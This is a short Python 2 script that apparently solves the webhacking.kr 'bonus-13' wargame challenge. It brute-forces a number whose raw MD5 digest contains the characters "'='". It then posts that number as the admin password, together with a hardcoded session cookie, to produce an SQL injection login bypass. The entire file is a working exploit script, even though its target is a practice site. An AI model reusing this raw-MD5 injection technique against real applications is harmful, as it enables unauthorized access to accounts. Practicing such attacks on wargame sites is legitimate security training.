#-*- coding: utf-8 -*-
import urllib
import urllib2
import hashlib
import CookieManager

print "[+] Find MD5 Vulnerable Value"
plaintext = 0
while True:
    if hashlib.md5(str(plaintext)).digest().find("'='") > 0:
        break
    plaintext += 1
    
print "[!]", str(plaintext)
print

print "[+] SQL Injection"

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-13/index.php"
parameters = urllib.urlencode({
    "id": "admin", 
    "pw": str(plaintext)
})
CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")
httpRequest = urllib2.Request(challengeUrl, parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: "POST"
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
